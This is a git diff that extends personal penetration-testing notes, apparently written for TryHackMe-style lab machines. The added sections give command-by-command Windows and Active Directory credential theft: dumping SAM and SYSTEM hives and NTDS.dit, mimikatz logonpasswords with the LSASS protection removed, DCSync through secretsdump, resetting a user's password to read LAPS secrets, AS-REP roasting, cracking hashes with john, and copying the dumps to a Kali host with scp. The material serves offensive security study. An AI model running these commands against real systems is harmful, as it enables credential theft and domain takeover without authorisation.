@@ -80,6 +80,13 @@ then try `rockyou.txt` wordlist with both hashcat and john. Because sometimes on
 
 ----
 
+UNZIP THE rockyou.txt.gz file first
+```
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+----
+
 john will automatically identify the hashing algorithm
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
@@ -89,13 +96,22 @@ Then show the recovered password:
 john --show hash.txt
 ```
 
+-----------
+
+TO GET THE HASH FIRST FROM SYSTEM AND SAM : 
+```
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam -system system LOCAL
+```
+
 ----
 
+AFTER YOU GET THE HASH FROM SAM AND SYSTEM : 
 For Password Hashes from <span style="color:rgb(11, 142, 224)">SAM and SYSTEM</span> files : 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt
 ```
-Format : `RID : LM hash : NT hash`
+Original format of Hash `Username : RID : LM hash : NT hash`
+In the `hash.txt` file you have to put only the `NT Hash` part
 Then show the recovered password:
 ```
 john --show --format=nt hash.txt
@@ -107,6 +123,7 @@ For common <span style="color:rgb(11, 142, 224)">Kerberoasting</span> hashes (`$
 ```
 john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
+or you can use `--format=krb5asrep` as per requirement of hash
 Then show the recovered password:
 ```
 john --show --format=krb5tgs hash.txt
@@ -429,13 +446,21 @@ sudo systemctl start ssh
 ```
 
 Windows PowerShell:
-```powershell
-scp C:\path\to\file.txt kali@<KALI_IP>:/home/kali/
+```
+powershell
 ```
 
+For a file : 
 ```powershell
-scp C:\Tools\mimikatz_trunk\x64\sample2.txt kali@10.150.73.2:/home/kali/Downloads
+scp C:\path\to\file.txt kali@<KALI_IP>:/home/kali/Downloads
 ```
+
+For a directory :
+```
+scp -r "C:\temp\Active Directory" kali@<KALI_IP>:/home/kali/Downloads/
+```
+1. Spaces in the folder name: `Active Directory` must be enclosed in quotes.
+2. Copying a directory: use `-r` to copy a directory recursively.
 ### <span style="color:rgb(11, 142, 224)">Windows (AD -authenticated SMB share) → Kali Linux</span>
 
 #### On Kali
@@ -4063,6 +4088,301 @@ if lab , simulate a logon as admin
 change the pass of an admin and login
 
 ### ==🟢Credential Harvesting==
+
+==🔴YOU NEED TO BE ADMIN FIRST ON A MACHINE==
+
+#### ==🔵Common Windows Locations==
+
+PowerShell commands history file : 
+```
+C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+it will give all the "password" strings ; /s for recursively
+Local Machine 
+```
+reg query HKLM /f password /t REG_SZ /s
+```
+
+Current User
+```
+reg query HKCU /f password /t REG_SZ /s
+```
+
+enumerate a user : 
+switch to powershell 
+```
+powershell
+```
+run
+```
+Get-ADUser -Identity victim -Properties *
+```
+
+#### ==🔵Local Windows Credentials==
+
+##### Metasploit's HashDump
+
+using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes.
+```
+meterpreter > getuid
+Server username: THM\Administrator
+meterpreter > hashdump
+```
+##### Volume Shadow Copy Service (Method 1 to copy)
+
+open CMD as admin
+make a copy of sam and then access it because it is offline file and not in use
+```
+wmic shadowcopy call create Volume='C:\'
+```
+to list and confirm that we have a shadow copy
+```
+vssadmin list shadows
+```
+The output shows that we have successfully created a shadow copy volume of (C:) with the following path: `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`.
+
+Now copy both files (sam and system) from the shadow copy volume we generated to the desktop
+```
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
+```
+
+now transfer both file to kali using scp
+##### Registry Hives (Method 2 to copy)
+
+Copy both files (sam and system) to desktop : 
+```shell-session
+reg save HKLM\sam C:\users\Administrator\Desktop\sam
+
+reg save HKLM\system C:\users\Administrator\Desktop\system
+```
+
+now transfer both file to kali using scp
+##### DeCrypt both the sam and system files : 
+
+DeCrypt : 
+```
+impacket-secretsdump -sam sam -system system LOCAL
+```
+
+#### ==🔵Extracting Creds From LSASS Dump==
+
+we will use mimikatz
+```
+.\mimikatz.exe
+privilege::debug
+```
+run : 
+```
+mimikatz # sekurlsa::logonpasswords
+```
+
+if you get this error : `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)` 
+Then : 
+download `mimidrv.sys` and `mimilib.dll` also to same folder of mimikatz `mimikatz.exe` (https://github.com/ParrotSec/mimikatz/tree/master/x64)
+
+load some drivers in mimikatz which will remove LSA protection from LSASS
+```
+mimikatz # !+
+```
+remove protection
+```
+!processprotect /process:lsass.exe /remove
+```
+run : 
+```
+mimikatz # sekurlsa::logonpasswords
+```
+
+now you can create LSASS dump file also 
+open task manager > details (on top) > find `lsass.exe` > right click > create dump file
+it wil be created to C:\Users\thm\AppData\Local\Temp\lsass.DMP
+```
+cd C:\Users\thm\AppData\Local\Temp\
+dir
+```
+#### ==🔵Windows Credential Manager==
+##### Accessing Credential Manager : 
+
+list the current windows vaults available in the Windows target : 
+```
+vaultcmd /list
+```
+By default, Windows has two vaults, one for Web and the other one for Windows machine credentials.
+
+check if there are any stored credentials in the Web Credentials vault : 
+```
+VaultCmd /listproperties:"Web Credentials"
+```
+
+The output shows that we have one stored credential in the specified vault. Now let's try to list more information about the stored credential : 
+```
+VaultCmd /listcreds:"Web Credentials"
+```
+No. `VaultCmd /listcreds:"Web Credentials"` does not reveal the password.
+##### Credential Dumping
+
+Use PowerShell Scripts [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)
+
+username and password for accessing the internal application : 
+run one by one : 
+```
+powershell -ex bypass
+Import-Module C:\Tools\Get-WebCredentials.ps1
+Get-WebCredentials
+```
+
+##### RunAs
+
+By providing the `/list` argument, we can show all stored credentials, or we can specify the credential to display more details `/list:computername`.
+
+this will show all the Currently stored credentials:
+```
+cmdkey /list
+```
+
+use runas to execute Windows applications as the `<username>` :
+```
+runas /savecred /user:THM.red\thm-local cmd.exe
+```
+
+##### Mimikatz
+
+```
+.\mimikatz.exe
+privilege::debug
+sekurlsa::credman
+```
+
+#### ==🔵Extracting Creds From Domain Controller== 
+
+dump Domain Controller Hashes locally and remotely.
+New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc.
+##### Local Dumping (No Credentials)
+
+This is usually done if you have no credentials available but have administrator access to the domain controller.
+
+To successfully dump the content of the NTDS file we need the following files:
+- C:\Windows\NTDS\ntds.dit
+- C:\Windows\System32\config\SYSTEM
+- C:\Windows\System32\config\SECURITY
+
+Dumping the content of the NTDS file from the Victim Machine
+```shell-session
+powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+```
+
+Now, if we check the `c:\temp` directory
+```
+cd c:\temp
+dir
+```
+we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to Kali
+
+Kali:
+```bash
+sudo systemctl start ssh
+```
+For a directory :
+```
+scp -r "C:\temp\Active Directory" kali@192.168.163.199:/home/kali/Downloads/
+scp -r "C:\temp\registry" kali@192.168.163.199:/home/kali/Downloads/
+```
+
+Extract hashes from NTDS dumped memory file Locally
+```
+impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit local
+```
+
+##### Remote Dumping (With Credentials)(DC Sync)
+
+This is usually done if you have credentials available for for users with administrative access to a domain controller
+```
+impacket-secretsdump -just-dc THM.red/<AD_Admin_Username>@10.49.178.221
+```
+it will prompt for entering the password
+
+#### ==🔵Local Administrator Password Solution (LAPS)(low probabilty)== 
+
+The goal is to discover which account is allowed to read the LAPS password and which computer's password it can retrieve.
+
+First, check if LAPS is installed in the machine : 
+```
+dir "C:\Program Files\LAPS\CSE"
+```
+Check if `AdmPwd.dll` is present . If yes , next 
+
+find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS i.e which OU has the permission to read the password
+switch to powershell
+```
+Find-AdmPwdExtendedRights -Identity THMorg
+```
+
+The output shows that the `THMGroupReader` group in `THMorg` has the right access to LAPS. Let's check the group and its members.
+```
+net groups "THMGroupReader"
+```
+see the "Members" it has
+
+We found that the `bk-admin` user is a member of `THMGroupReader`
+so in order to get the LAPS password, we need to compromise or impersonate the bk-admin user. 
+
+so now we change the password of the user we found out 
+open cmd as admin
+```
+net user <username> <new password> /domain
+net user bk-admin Password@123 /domain
+```
+
+now we runas (login) into the user
+```
+runas /user:bk-admin cmd.exe
+```
+
+now in the new terminal that opens 
+switch to powershell
+```
+Get-AdmPwdPassword -ComputerName creds-harvestin
+```
+#### ==🔵AS Rep Roasting== 
+
+first make a list of usernames in 
+```
+nano users.txt
+```
+
+change dc ip and domain name
+```
+impacket-GetNPUsers -dc-ip 10.48.165.220 thm.red/ -usersfile users.txt
+```
+we have got the as-rep of one user `victim`
+
+# ==🔵Active Directory NEW==
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
